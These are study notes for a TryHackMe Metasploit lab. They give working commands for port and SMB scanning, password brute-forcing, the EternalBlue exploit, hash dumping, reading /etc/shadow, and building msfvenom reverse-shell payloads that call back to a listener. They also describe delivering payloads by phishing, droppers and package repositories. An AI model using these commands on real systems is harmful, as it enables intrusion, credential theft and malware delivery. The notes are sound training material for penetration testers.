# Metasploit: Exploitation Basics
Use Metasploit for scanning, vulnerability assessment and exploitation.

## Content:
[Task 1: Introduction](#task-1-introduction)
<br>[Task 2: Scanning](#task-2-scanning)
<br>[Task 3: Metasploit Database](#task-3-metasploit-database)
<br>[Task 4: Vulnerability Scanning](#task-4-vulnerability-scanning)
<br>[Task 5: Exploitation](#task-5-exploitation)
<br>[Task 6: Msfvenom](#task-6-msfvenom)
<br>[To note](#to-note)

## Task 1: Introduction
| Term | Description |
|------|-------------|
| Metasploit usage| To scan target systems and to conduct vulnerability scan. |
| Database feature | To manage pentration testing engagements with a broader scope. |
| msfvenom | To generate payloads and start Meterpreter session on target system. |

To note:
<ul>
<li>TryHackMe - For attacks that require wordlist: <code>/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt</code></li>
<li>To run Metasploit: <code>msfconsole</code></li>
</ul>

## Task 2: Scanning
<ol>
<li>Port Scanning</li>
<li>UDP service Identification</li>
<li>SMB Scans</li>
<li>Other scans</li>
<li>THM Questions</li>
</ol>

<u><b>Port Scanning</b></u>
<br>Metasploit has several modules to scan open ports on target system and network.
| Term | Description |
|------|-------------|
| To list potential port scanning modules available. | Command line: ` search portscan`<br>Need to set a few options (`show options`):<ul><li><b>CONCURRENCY:</b> No. of targets to be scanned simultaneously.</li><li><b>PORTS:</b> Port range to be scanned. To note: Nmap '1-1000' scans the 1000 most used ports. Metasploit '1-1000' scans port numbers from 1 to 10000.</li><li><b>RHOSTS:</b> Target or target network to be scanned.</li><li><b>THREADS:</b> No. of threads used to simultaneously. More threads, faster scans.</li></ul> |
|To perform Nmap scans from msfconsole directly. | Command line: `nmap -sS 10.10.12.229 `<br>Nmap is a network discovery and security-auditing tool; use it to find hosts and services on a network, discover open ports, identify running services/ versions, detect OSes and run scripted checks (E.g. vulnerability or info-gathering scripts.) |

<u><b>UDP service Identification</b></u>
<br>Module: `scanner/discovery/udp_sweep` quickly identifies services running over UDP. Will not conduct an extensive scan of all possible UDP services but provides a quick way to idnetify services such as DNS or NetBIOS.

| Command | Action |
|---------|---------|
| `use auxiliary/scanner/discovery/udp_sweep`<br>`run` | To run UDB service identification scan. |

<u><b>SMB Scans</b></u>
<br>Metasploit offers several auxiliary modules to scan specific services, for e.g. SMB. Modules: `smb_enumshares` and `smb_version` - Useful for corporate network.

<u><b>Other scans</b></u>
<ul><li><b>NetBIOS (Network Basic Input Output System):</b> Similar to SMB; allows computers to communicate over network to share files or send files to printer. NetBIOS name of target system can give idea of its role/ importance (E.g. CORP-DC, DEVOPS, SALES.). May also come across shared files and folders that can be accessedd without password or protected with simple password (E.g. admin, administrator, root, toor.).</li>
<li>Metasploit has many modules to help you better understadn target system and find vulnerabilities. Worth performing quick search to see if any modules can be helpful based on target system.</li>
</ul>

<u><b>THM Questions</b></u>
| Question | Answer |
|---------|---------|
| How many ports are open on the target system? | `msfconsole`<br><br>`nmap -sS <target_machine_IP>`<br>`nmap -sS 10.10.38.182`<br><br>or<br><br>`search portscan`<br>`use use auxiliary/scanner/portscan/tcp`<br>`show options`<br>`set rhost 10.10.38.182`<br>`run` |
| Using the relevant scanner, what NetBIOS name can you see? | `search netbios`<br>`use auxiliary/scanner/netbios/nbname`<br>`set RHOSTS 10.10.38.18`|
| What is running on port 8000?<br><ul><li>Port 8000 used for web servers and HTTP-based applications, so research HTTP version modules in Metasploit.</li></ul> | `back`<br>`search http_version`<br>`use 0`<br>`show options`<br>`set rhost 10.10.38.182`<br>`set rport 8000`<br>`run` |
| What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task. | `back`<br>`search smb_login`<br>`use 0`<br>`set rhost 10.10.38.182`<br>`set smbuser penny`<br>`set pass_file /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt`<br>`run` |

## Task 3: Metasploit Database
<ul>
<li>Interact with single target: Don't need database.</li>
<li>Actual penetration engagement has several targets: Database used to simplify project management and avoid confusion when setting up paramenter values.</li>
</ul>

| Action | Command |
|--------|---------|
|  <ol><li>For THM Attackbox: Database has alr been created, so need to delete first if want to perform the rest of the steps.</li><li>Start the PostgreSQL database.</li><li>Initialize the Metasploit database, as non-root user (Otherwise, get error.).</li><li>Launch Metasploit.</li><li>Check database status.</li></ol> | <ol><li>`sudo -u postgres msfdb delete`</li><li>`systemctl start postgresql`</li><li>`sudo -u postgres msfdb init`</li><li>`msfconsole`</li><li>`db_status`</li> |
| <ul><li>List available workspaces.</li><li>Add workspace.</li><li>Delete workspace.</li><li>Switch workspace.</li><li>List available options for `workspace`.</li></ul> | <ul><li>`workspace -1` or `workspace -v`</li><li>`workspace -a tryhackme`</li><li>`workspace -d tryhackme`</li><li>`workspace <workspace_name>`</li><li>`workspace -h`</li></ul> |
| Once Metasploit launched with database, `help` will show Database Backends Commands menu. Different from regulat Metasploit usage. | `help` |
| <ul><li>Run Nmap scan using `db_nmap`, all results will be saved to database.</li><li>Can now reach info relevant to hosts and services running on target systems.</li><li>Help menus for hosts and services.</li><li>Add values to RHOSTS parameter.</li></ul> | <ul><li>`hosts` or `services`</li><li>`hosts -h` or `services -h`</li><li>`hosts -R`</li></ul> |
|Search for specific services in environment.<br>Might want to look for low-hanging fruits such as:<ul><li><b>HTTP:</b> Could potentially host web application where can find vulnerabilities such as SQL injection or RCE.</li><li><b>FTP:</b> Could allow anonymous login and provide access to interesting files.</li><li><b>SMB:</b> Could be vulnerable to SMB exploits like MS17-010.<li><b>SSH:</b> Could have default/ easy-to-guess creds.</li><li><b>RDP:</b> Could be vulnerable to Bluekeep or allow desktop access if weak creds were used.</li></ul> | `services -S netbios` |

<u><b>Workflow</b></u>
<ol>
<li>Find available hosts with `db_nmap`.</li>
<li>Scan these hosts for further vulnerability by using vulnerability scanning module that finds potential MS17-010 vulnerabilities with <code>use auxiliary/scanner/smb/smb_ms17_010</code>.</li>
<li>Set RHOSTS value with <code>hosts -R</code>.</li>
<li>Run exploit with <code>run</code> or <code>exploit</code>.
</ol>

## Task 4: Vulnerability Scanning
<ul>
<li>Metasplot allows quick identification of some critical vulnerabilities that are considered to be low-hanging fruits.</li>
<li>Low-hanging fruits =  easily identifiable and exploitable vulnerabilities that can gain foothold on a system and might gain high-level privileges such as root/ administrator.</li>
<li>Find vulnerabilities using Metasploit will rely heavily on your ability to scan and fingerprint target.</li>
</ul>

<u><b>Workflow</b></u>
<ol>
<li>Identify VNC service running on target, so use <code>search</code> to list useful modules. Results will contain payload and post modules, which are not v useful as haven't discovered potential exploit to use.</li>
<li>But in case of VNC, can use several scanner modules. List scanner modules with <code>use auxiliary/scanner/vnc/</code>.</li>
<li>Use vnc_login module with <code>use auxiliary/scanner/vnc/vnc_login</code>.</li>
<li>Have better understanding of module and its purpose with <code>info</code>. Realize that vnc_login module can help us find login details for VNC service.</li>
</ol>

## Task 5: Exploitation
Metasploit is an exploitation framework. For successful outcome, need to have thorough understanding of services running on target system.

| Action | Command |
|--------|---------|
| <ol><li>Search for exploits.</li><li>Obtain more info about exploit.</li><li>Launch exploit.</li></ol> | <ol><li>`search`</li><li>`info`</li><li>`exploit` or `run`</li></ol> |
| Most exploits have preset default payload. But there are other commands for (selected) exploit. | `show payloads` |
| Set payload of choice.<br>To note: Choosing working payload is a trial-and-error process because of environmental/ OS restrictions such as firewall rules, AV, file writing or program performing payload execution isn't available (E.g. payload/python/shell_reverse_tcp. | `set payload <payload_name/ payload_number>` |
| <ol><li>List required parameters.</li><li>Set parameter values.</li></ol> | <ol><li>`show options`</li><li>`set lhost 10.10.186.44`</li></ol> |
| Once session is opened, can <ul><li>background</li><li>abort it.</li></ul>Background session useful when working on more than one target simultaneously or same target with different exploit/ shell. | <ul><li>`CTRL+Z`</li><li>`CTRL+C`</li></ul> |
| <u><b>Working with sessions</b></u><ul><li>List all active sessions.</li><li>List session help menu.</li><li>Interact with existing session.</li></ul>  | <ul><li>`sessions`</li><li>`sessions -h`</li><li>`sessions -i <session_ID>`</li></ul> |

<u><b>THM Questions</b></u>
| Question | Answer |
|---------|---------|
| Exploit one of the critical vulnerabilities on the target VM. | [Regular command prompt]<br>`msfconsole`<br><br>[msfconsole prompt]<br>`search type:exploit eternalblue`<br>`use exploit/windows/smb/ms17_010_eternalblue`<br>`show options`<br>`set rhost 10.201.117.227`<br>`run` |
| What is the content of the flag.txt file? | [Meterpreter prompt]<br>`help`<br>`search -f flag.txt`: Search by file name.<br>`cat "c:\Users\Jon\Documents\flag.txt"` or `cat /Users/Jon/Documents/flag.txt` |
| What is the NTLM hash of the password of the user "pirate"? | [Meterpreter prompt]<br>`help`<br>`hashdump` |

<b>Windows SAM / pwdump-style account record:</b> pirate:1001:aad3b435b51404eeaad3b435b51404ee:8ce9a3ebd1647fcc5e04025019f4b875:::
<ul>
<li><b>pirate:</b> Username</li>
<li><b>1001:</b> User identifier (RID/UID)</li>
<li><b>aad3b435b51404eeaad3b435b51404ee:</b> LM hash (this specific value is the well-known empty/disabled LM value).</li>
<li><b>8ce9a3ebd1647fcc5e04025019f4b875:</b> NT (NTLM) hash (32 hex characters).</li>
<li><b>Remaining <code>:::</code>:</b> Empty fields (comment/home/shell equivalents in this export format)</li>
</ul>

## Task 6: Msfvenom
<ul>
<li>Replaced Msfpayload and Msfencode.</li>
<li>Generate payloads in different formats (E.g. PHP, exe, dll, elf.) and for different target systems (E.g. Apple, Windows, ANdroid, Linux.).</li>
<li>Able to access all payloads available in the Metasploit framework.</li>
</ul>

| Action | Command |
|--------|---------|
| To list payloads available in Metasploit Framework. | [Regular command prompt] `msfvenom -l payloads` |

<ol>
<li>Output formats</li>
<li>Encoders</li>
<li>Handlers</li>
<li>Other payloads</li>
<li>THM Questions</li>
</ol>

<u><b>Output formats</b></u>
<ul>
<li>Can generate stand-alone payloads (E.g. a Windows executable for Meterpreter) or get a usable raw format (E.g. python).</li>
<li> List supported output formats: <code>msfvenom --list formats</code></li>
</ul>

<u><b>Encoders</b></u>
<ul>
<li>Encoders don't aim to bypass AV installed on target system; they encode payload.</li>
<li>Encoding can be effective against some AV software, but using modern obfuscation techniques or learning methods to inject shellcode is better solution to bypassing AV installed on target system.</li>
<li>Encode with parameter <code>-e</code> in Base64 and output format in <code>raw</code>: <code>msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64</code></li>
</ul>

<u><b>Handlers</b></u>
<ul>
<li>Similar to exploits using reverse shell, need to accept incoming connections generated by MSFVenom payload. Term used to receive connection from target = Catching a shell.</li>
<li>When using exploit module, this part is automatically handled by exploit module; <code>payload options</code> title appeared when setting reverse shell.</li>
<li>In MSFvenom payload, reverse shells/ Meterpreter callbacks generated can be easily caught using a handler.</li>
</ul>

<b>Example Workflow</b>
| No. | Step | Command |
|-----|------|---------|
| 1. | Generate PHP shell using MSFvenom.<br>Will require<ul><li>payload</li><li>local machine IP address = address of AttackBox</li><li>local port to which payload will connect to</li></ul><br><br>Output PHP file incorrectly comments out the starting PHP tag `?*<?php /**?>` and misses the end tag `?>`. | [Regular command prompt]<br>`msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php`<br><br>Edit reverse_shell.php with  `<php` and `?>`|
| 2. | Start Metasploit handler to receive incoming connection with module Multi Handler. Multi Handler supports all Metasploit payloads and can be used for Meterpreter and regular shells. | [msfconsole prompt]<br>`use exploit/multi/handler`<br>`set payload php/reverse_php`<br>`set lhost 10.0.2.19`<br>`set lport 7777` |
| 3. | Execute PHP shell and wait for incoming connection to be received by multi/handler and provide us with a shell.<br>If payload was set as Meterpreter (E.g. in a Windows executable format), multi/handler would then provide us with a Meterpreter shell. | `run` |

<u><b>Other payloads</b></u>
<ul>
<li>msfvenom can be used to create payloads in almost all formats, based on target system's configuration (E.g. OS, install webserrverm installed interpreter.).</li>
<li>LHOST = IP address of attacking machine. LPORT = port on which handler will listen.</li>
</ul>

<b>Examples of reverse payloads</b>
<ul>
<li>Will need to have exploit/multi/handler module listening on attacking machine to work as handler.</li>
<li>Will need to set up handler accordingly with payload, LHOST, LPORT parameters and must be the same as what was used when creating the msfvenom payload.</li>
</ul>

| Format | Command |
|--------|---------|
| Linux Executable and Linkable Format (elf)<br>.elf format comparable to .exe format in Windows; executable files for Linux. However, need to make sure they have executable permissions on target machine. E.g. Once you have shell.elf file on target machine, `chmod +x shell.elf` to accord executable permissions. Once done, `./shell/elf` on target machine to run file. | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf` |
| Windows | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe` |
| PHP | `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php` |
| ASP | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp` |
| Python | `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py` |

<u><b>THM Questions</b></u>
| Question | Answer |
|---------|---------|
| Launch the VM attached to this task. The username is murphy, and the password is 1q2w3e4r. You can connect via SSH or launch this machine in the browser. Once on the terminal, type "sudo su" to get a root shell, this will make things easier.| [Target machine]<br>`sudo su`<br>`1q2w3e4r` for username `murphy` |
| Create a meterpreter payload in the .elf format (on the AttackBox, or your attacking machine of choice). | [AttackBox] [Regular command prompt]<br><code>sudo ss -tulpn insert_pipeline grep ':777'</code>: To check if port is in use.<br>`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.201.52.162 LPORT=777 -f elf > rev_shell.elf` |
| Transfer it to the target machine (you can start a Python web server on your attacking machine with the python3 -m http.server 9000 command and use wget http://ATTACKING_MACHINE_IP:9000/shell.elf to download it to the target machine). | [AttackBox][Regular command prompt][New terminal]<br>`python3 -m http.server 9000`: To start a Python web server.<br><br>[Target machine]<br>`wget http://10.201.52.162:9000/rev_shell.elf`: To download payload onto target machine.<br>`chmod +x rev_shell.elf` |
| Get a meterpreter session on the target machine. | `msfconsole`<br>`use exploit/multi/handler`<br>`show options`<br>`set lhost 10.201.52.162`<br>`set lport 777`<br>`set payload linux/x86/meterpreter/reverse_tcp`<br>`run`<br><br>[Target machine]<br>`./rev_shell.elf` |
| Use a post exploitation module to dump hashes of other users on the system. | Cannot use `hashdump` because that's for Windows and this is a Linux machine.<br><br>`run post/linux/gather/hashdump`<br><br>or<br><br>`cd etc`<br>`cat shadow` |
| What is the other user's password hash? | |

## To note
<ul>
<li>[Meterpreter prompt] When using file path with `cat`, need quotation marks around file path to treat file path as one token.</li>
<li>`dir`: List files on remote/target machine. `ldir`: List files on your local machine; the host runnign msfconsole/ Meterpreter client/ attacking machine.</li>
<li>msfvenom: To create stand-alone Meterpreter payloads which are useful in situations where you can upload file to target system or have ability to download files to target system.</li>
<li>Metsasploit payloads inside msfconsole vs. msfvenom</li>
<li>Metasploit payloads inside msfconsole: Run exploit module directly from msfconsole and want exploit to stage payload + create session automatically. Want quick interactive testing, `check`, `show payloads` and automatic handler management.</li>
<li>msfvenom: Create portable payload artifacts that you can deliver outside msfconsole; to upload and deliver to target outside msfconsole. Artifacts = E.g. Windows EXE, Linux ELF, PowerShell script, PHP backdoor, APK, Office macro, raw shellcode. Deliver via e.g. phishing, dropper, compiled app, container image. Other purposes such as embed payloads inside binary or installer or combine shellcode into exploit payloads that expect raw shell code, support delivery methods that aren't directly handled by an exploit module (E.g. Drop an EXE via a web upload, craft malicious document or host ELF in package repo.)</li>
<li><b>Typical workflow for exploit module in-console:</b> 1. `use exploit/...` 2. `set payload ...` 3. `exploit` - Metasploit will start handler automatically. No msfvenom step needed unless want a file.
<li><b>Typical workflow for artifact delivery for EXE:</b> 1. Build EXE with msfvenom. 2. Start handler in msfconsole with matching `PAYLOAD`, `LHOST`, `LPORT`. 3. Deliver EXE to target (E.g. upload, phishing) and run it. 4. Handler receives a Meterpreter session. <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe</code></li>
<li><b>Typical workflow for raw shellcode embedding:</b> Generate `-f raw` shellcode and embed it into custom exploit or injector. Useful for exploit dev or when an exploit requires raw shellcode bytes. <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.bin</code></li>
<li><b>Typical workflow for fileless/ command delivery using PowerShell/one-liner:</b> Generate `psh-cmd` and execute it on target (via remote command execution, macro, RCE bug, etc.). Start handler to catch the reverse session. <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=... -f psh-cmd</code></li>
</ul>
